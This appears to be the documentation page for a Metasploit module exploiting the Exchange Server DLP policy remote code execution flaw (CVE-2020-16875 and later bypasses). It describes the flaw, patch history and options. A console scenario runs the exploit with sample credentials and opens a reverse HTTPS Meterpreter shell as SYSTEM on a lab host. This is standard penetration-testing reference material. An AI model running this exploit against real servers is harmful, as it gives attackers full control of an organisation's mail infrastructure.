## Vulnerable Application

### Description

This vulnerability allows remote attackers to execute arbitrary code on affected installations of Exchange Server.
Authentication is required to exploit this vulnerability. Additionally, the target user must have the `Data Loss
Prevention` role assigned and an active mailbox.

If the user is in the `Compliance Management` or greater `Organization Management` role groups, then they have the `Data
Loss Prevention` role. Since the user who installed Exchange is in the `Organization Management` role group, they
transitively have the `Data Loss Prevention` role.

The specific flaw exists within the processing of the `New-DlpPolicy` cmdlet. The issue results from the lack of proper
validation of user-supplied template data when creating a DLP policy. An attacker can leverage this vulnerability to
execute code in the context of `SYSTEM`.

Tested against Exchange Server 2016 CU19 on Windows Server 2016.

#### A Note On Patches And Bypasses

The root cause of this vulnerability was first identified and reported to Microsoft who assigned it CVE-2020-16875 and
attempted to fix it in Exchange Server 2016 Cumulative Update (CU) 18 and Exchange Server 2019 CU7 which were released
on September 15th, 2020. The patch was later able to be [bypassed][1], allowing newer versions upto and including 
Exchange Server 2016 CU19 and Exchange Server 2019 CU8 which were released on December 15th 2020. One of the first patch
bypasses was assigned CVE-2020-17132 and was addressed by Microsoft, however that patch too was able to be bypassed.

### Setup

Set up a [vulnerable target](#targets).

## Verification Steps

Follow [Setup](#setup) and [Scenarios](#scenarios).

## Targets

### 0

`Exchange Server <= 2016 CU19 and 2019 CU8`

## Options

### USERNAME

Set this to the OWA username.

### PASSWORD

Set this to the OWA password.

## Scenarios

### Exchange Server 2016 CU17 on Windows Server 2016

```
msf6 > use exploit/windows/http/exchange_ecp_dlp_policy 
[*] Using configured payload windows/x64/meterpreter/reverse_https
msf6 exploit(windows/http/exchange_ecp_dlp_policy) > set USERNAME smcintyre
USERNAME => smcintyre
msf6 exploit(windows/http/exchange_ecp_dlp_policy) > set PASSWORD Password1
PASSWORD => Password1
msf6 exploit(windows/http/exchange_ecp_dlp_policy) > set VHOST WIN-BPID95ACQ7E
VHOST => WIN-BPID95ACQ7E
msf6 exploit(windows/http/exchange_ecp_dlp_policy) > show options 

Module options (exploit/windows/http/exchange_ecp_dlp_policy):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   Password1        no        OWA password
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.159.42   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      443              yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path
   USERNAME   smcintyre        no        OWA username
   VHOST      WIN-BPID95ACQ7E  no        HTTP server virtual host


Payload options (windows/x64/meterpreter/reverse_https):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.159.128  yes       The local listener hostname
   LPORT     8443             yes       The local listener port
   LURI                       no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   Exchange Server <= 2016 CU19 and 2019 CU8


msf6 exploit(windows/http/exchange_ecp_dlp_policy) > check
[*] 192.168.159.42:443 - The target appears to be vulnerable. Exchange Server 15.1.2176 is a vulnerable build.
msf6 exploit(windows/http/exchange_ecp_dlp_policy) > exploit

[*] Started HTTPS reverse handler on https://192.168.159.128:8443
[*] Executing automatic check (disable AutoCheck to override)
[+] The target appears to be vulnerable. Exchange Server 15.1.2176 is a vulnerable build.
[*] Logging in to OWA with creds smcintyre:Password1
[+] Successfully logged in to OWA
[*] Retrieving ViewState from DLP policy creation page
[+] Successfully retrieved ViewState
[*] Creating custom DLP policy from malicious template
[*] https://192.168.159.128:8443 handling request from 192.168.159.42; (UUID: lg8kqsog) Staging x64 payload (201308 bytes) ...
[*] Meterpreter session 1 opened (192.168.159.128:8443 -> 192.168.159.42:37415) at 2021-01-13 09:17:08 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : WIN-BPID95ACQ7E
OS              : Windows 2016+ (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : EXCHG
Logged On Users : 9
Meterpreter     : x64/windows
meterpreter > 
```

[1]: https://srcincite.io/blog/2021/01/12/making-clouds-rain-rce-in-office-365.html
